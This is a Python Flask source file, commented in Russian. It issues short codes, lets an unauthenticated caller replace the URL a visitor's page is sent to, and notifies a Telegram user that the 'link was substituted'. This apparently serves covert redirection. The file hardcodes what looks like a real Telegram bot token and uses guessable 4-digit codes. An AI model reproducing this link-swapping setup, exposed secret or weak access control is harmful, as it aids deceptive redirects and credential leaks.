from flask import Flask, render_template, request, jsonify, make_response
import random
from datetime import datetime, timedelta
from threading import Lock
import logging
import time
import threading
import os
from urllib.parse import urlparse, parse_qs
import requests



BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__)))

app = Flask(
    __name__,
    template_folder=os.path.join(BASE_DIR, 'templates'),
    static_folder=os.path.join(BASE_DIR, 'static')
)

# Хранилище кодов и ссылок
code_storage = {}
storage_lock = Lock()
CODE_EXPIRE = timedelta(minutes=2)
TELEGRAM_BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler()  # Пишем в stdout (подходит для Docker, systemd, gunicorn и т.д.)
    ]
)
logger = logging.getLogger(__name__)

def generate_unique_code():
    while True:
        code = str(random.randint(5000, 9999))
        with storage_lock:
            if code not in code_storage:
                return code


@app.route('/')
def index():
    code = generate_unique_code()
    
    with storage_lock:
        code_storage[code] = {
            'created': datetime.now(),
            'target_url': "https://ru.wikipedia.org/wiki/",
            'used': False
        }

    months = [
        "января", "февраля", "марта", "апреля", "мая", "июня",
        "июля", "августа", "сентября", "октября", "ноября", "декабря"
    ]
    now = datetime.now()
    current_date = f"{now.day} {months[now.month - 1]} {now.year}"

    logger.info(f"Сгенерирован новый код: {code}")
    
    response = make_response(render_template('base.html', code=code, current_date=current_date))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'

    return response


@app.route('/update_code', methods=['POST'])
def update_code():
    data = request.json
    logger.info("=== Получен запрос на обновление кода ===")
    logger.info(f"Входные данные: {data}")
    
    code = data.get('code')
    new_url = data.get('new_url')
    
    if not code or not new_url:
        logger.warning("Ошибка: отсутствует код или URL")
        return jsonify({'status': 'error', 'message': 'Missing parameters'}), 400
    
    with storage_lock:
        logger.info(f"Текущее хранилище кодов: {code_storage}")
        if code in code_storage:
            logger.info(f"Найден код {code}. Старый URL: {code_storage[code]['target_url']}")
            code_storage[code]['target_url'] = new_url
            code_storage[code]['used'] = True
            logger.info(f"Код {code} обновлён: {code_storage[code]}")
            return jsonify({'status': 'success'})
    
    logger.error(f"Код {code} не найден в хранилище")
    return jsonify({'status': 'error', 'message': 'Code not found'}), 404


@app.route('/get_target_url')
def get_target_url():
    code = request.args.get('code')
    logger.info("=== Получен запрос на получение URL ===")
    logger.info(f"Запрошенный код: {code}")
    
    if not code:
        logger.warning("Ошибка: код не указан")
        return jsonify({'error': 'Code missing'}), 400
    
    with storage_lock:
        logger.info(f"Текущее хранилище кодов: {code_storage}")
        if code in code_storage:
            logger.info(f"URL для кода {code}: {code_storage[code]['target_url']}")
            return jsonify({
                'url': code_storage[code]['target_url'],
                'is_updated': code_storage[code]['used']
            })
    
    logger.warning(f"Код {code} не найден. Возвращается URL по умолчанию.")
    return jsonify({'url': "https://ru.wikipedia.org/wiki/", 'is_updated': False})


@app.route('/notify_if_updated', methods=['POST'])
def notify_if_updated():
    logger.info("🔔 Получен запрос /notify_if_updated")

    data = request.json
    url = data.get('url')
    logger.info(f"Переданный URL: {url}")

    if not url or "ref=" not in url:
        logger.warning("❌ URL отсутствует или не содержит параметр ref")
        return jsonify({'status': 'error', 'message': 'No ref in url'}), 400

    # Извлекаем user_id из ref
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    user_id = query_params.get('ref', [None])[0]
    logger.info(f"Извлечён user_id: {user_id}")

    if not user_id:
        logger.error("❌ Не удалось извлечь user_id из URL")
        return jsonify({'status': 'error', 'message': 'Invalid ref'}), 400

    # Формируем сообщение
    message_text = f"🔔 Ссылка подменена"
    payload = {
        'chat_id': user_id,
        'text': message_text
    }

    try:
        logger.info(f"Отправка сообщения Telegram-пользователю {user_id}...")
        response = requests.post(TELEGRAM_API_URL, json=payload)
        logger.info(f"Статус ответа Telegram API: {response.status_code}")
        logger.info(f"Ответ Telegram API: {response.text}")

        if response.ok:
            logger.info("✅ Сообщение успешно отправлено")
            return jsonify({'status': 'success'})
        else:
            logger.error("❌ Не удалось отправить сообщение через Telegram API")
            return jsonify({'status': 'error', 'message': 'Failed to send message'}), 500
    except Exception as e:
        logger.exception("💥 Ошибка при отправке сообщения Telegram-пользователю")
        return jsonify({'status': 'error', 'message': str(e)}), 500


def cleanup_expired_codes():
    """Очистка устаревших кодов"""
    while True:
        now = datetime.now()
        with storage_lock:
            expired = [code for code, data in code_storage.items()
                       if (now - data['created']) > CODE_EXPIRE]
            for code in expired:
                logger.info(f"Удалён устаревший код: {code}")
                del code_storage[code]
        time.sleep(60)

# === ВСТАВЬ ЭТО В САМОМ КОНЦЕ app.py ===
cleanup_thread = threading.Thread(target=cleanup_expired_codes, daemon=True)
cleanup_thread.start()
